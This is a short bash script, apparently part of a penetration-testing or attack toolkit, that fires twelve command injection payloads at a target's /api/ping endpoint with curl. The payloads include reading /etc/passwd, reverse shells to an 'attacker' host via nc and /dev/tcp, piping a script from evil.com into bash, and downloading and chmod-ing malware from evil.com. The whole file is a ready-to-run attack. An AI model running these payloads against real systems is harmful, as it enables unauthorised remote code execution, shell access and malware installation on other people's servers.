#!/bin/bash
TARGET="$1"

echo "========================================="
echo "[*] COMMAND INJECTION ATTACK MODULE"
echo "[*] Target: $TARGET"
echo "[*] Tool: curl"
echo "========================================="

echo ""
echo "[*] Sending command injection payloads to /api/ping"
echo "---"

declare -a PAYLOADS=(
  '127.0.0.1; whoami'
  '127.0.0.1 & cat /etc/passwd'
  '127.0.0.1 | ls -la'
  '127.0.0.1; nc -e /bin/sh attacker 4444'
  '$(whoami)'
  '127.0.0.1 && ifconfig'
  '`id`'
  '127.0.0.1; bash -i >& /dev/tcp/attacker/4444 0>&1'
  '127.0.0.1 | curl http://evil.com/shell.sh | bash'
  '127.0.0.1; python3 -c "import os; os.system(\"id\")"'
  '127.0.0.1 && wget http://evil.com/malware -O /tmp/m && chmod +x /tmp/m'
  '127.0.0.1; echo vulnerable > /tmp/pwned'
)

for payload in "${PAYLOADS[@]}"; do
  echo "[>] Payload: $payload"
  curl -s -X POST "$TARGET/api/ping" \
    -H "Content-Type: application/json" \
    -d "{\"host\": $(echo "$payload" | python3 -c 'import sys,json; print(json.dumps(sys.stdin.read().strip()))')}"
  echo ""
done

echo ""
echo "========================================="
echo "[+] Command Injection attack module complete"
echo "========================================="
